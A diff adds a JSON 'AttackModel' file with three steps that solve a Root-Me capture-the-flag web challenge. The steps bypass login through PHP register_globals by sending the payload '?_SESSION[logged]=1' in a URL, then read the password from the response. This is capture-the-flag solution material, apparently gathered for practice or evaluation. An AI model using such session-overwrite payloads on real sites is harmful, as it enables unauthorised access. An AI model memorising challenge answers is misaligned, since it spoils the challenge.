@@ -1,0 +1,18 @@
+{
+    "AttackModel": {
+        "Steps": [
+            {
+                "StepNumber": 1,
+                "StepString": "Bypass with PHP register globals ?_SESSION[logged]=1"
+            },
+            {
+                "StepNumber": 2,
+                "StepString": "Send a request to the server with the URL http://challenge01.root-me.org/web-serveur/ch17?_SESSION[logged]=1"
+            },
+            {
+                "StepNumber": 3,
+                "StepString": "Examine the response from the server for success and a password"
+            }
+        ]
+    }
+}
